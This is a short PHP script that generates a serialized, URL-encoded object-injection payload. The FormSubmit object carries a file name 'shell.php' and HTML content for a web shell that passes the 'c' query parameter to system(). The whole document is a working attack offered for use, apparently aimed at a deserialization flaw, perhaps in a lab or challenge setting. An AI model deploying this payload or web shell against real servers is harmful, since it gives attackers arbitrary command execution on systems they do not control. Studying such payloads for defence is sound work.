<?php
class FormSubmit {
	public $form_file = 'shell.php';
	public $message = '<!DOCTYPE html>
		<html>
        <head></head>
        <body>
        <form method="GET" action="/shell.php">
                        <div><label>Command:</label><input type="text" name="c"></div>
                </form>
                <output><?php if (isset($_GET["c"])) { str_replace(system($_GET["c"]), "\n", "<br>"); } ?></output>
        </body>
</html>';
}
echo urlencode(serialize(new FormSubmit));
?>

